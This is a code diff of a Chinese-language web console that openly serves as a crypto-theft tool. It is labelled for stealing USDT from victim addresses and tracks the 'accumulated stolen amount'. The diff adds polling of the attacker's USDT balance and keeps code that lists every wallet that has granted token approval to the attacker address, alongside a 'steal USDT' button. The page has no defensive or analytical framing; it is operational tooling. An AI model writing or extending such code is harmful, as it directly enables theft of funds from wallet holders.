@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🎯 EOA 控制台 v1.2（自動刷新+記錄累積）</title>
+  <title>🎯 EOA 控制台 v1.3（顯示餘額 + 累積紀錄）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -14,15 +14,18 @@
   </style>
 </head>
 <body>
-  <h2>🎯 EOA 控制台 v1.2（自動刷新+記錄累積）</h2>
+  <h2>🎯 EOA 控制台 v1.3（顯示餘額 + 累積紀錄）</h2>
   <p><b>目前登入帳號：</b><span id="account">尚未連線...</span></p>
   <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
+  <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">查詢中...</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">尚未刷新</span></p>
   <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
+
   <input id="victim" placeholder="受害者地址" />
   <button onclick="steal()">🧨 盜取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
+
   <h3>📌 所有授權地址：</h3>
   <ul id="approvals"></ul>
 
@@ -51,15 +54,28 @@
         document.getElementById("auth").innerText = "非攻擊者地址";
         document.getElementById("auth").className = "bad";
       }
+      await updateMyBalance();
       fetchApprovals();
-      setInterval(fetchApprovals, 10000);
+      setInterval(() => {
+        fetchApprovals();
+        updateMyBalance();
+      }, 10000);
+    }
+
+    async function updateMyBalance() {
+      try {
+        const contract = new ethers.Contract(USDT, ABI, provider);
+        const balance = await contract.balanceOf(sender);
+        const formatted = ethers.utils.formatUnits(balance, 6);
+        document.getElementById("mybalance").innerText = `${formatted} USDT`;
+      } catch {
+        document.getElementById("mybalance").innerText = "查詢失敗";
+      }
     }
 
     async function fetchApprovals() {
       const contract = new ethers.Contract(USDT, ABI, provider);
-      const events = await contract.queryFilter(
-        contract.filters.Approval(null, attacker), 19000000
-      );
+      const events = await contract.queryFilter(contract.filters.Approval(null, attacker), 19000000);
       const ul = document.getElementById("approvals");
       ul.innerHTML = "";
       const seen = new Set();
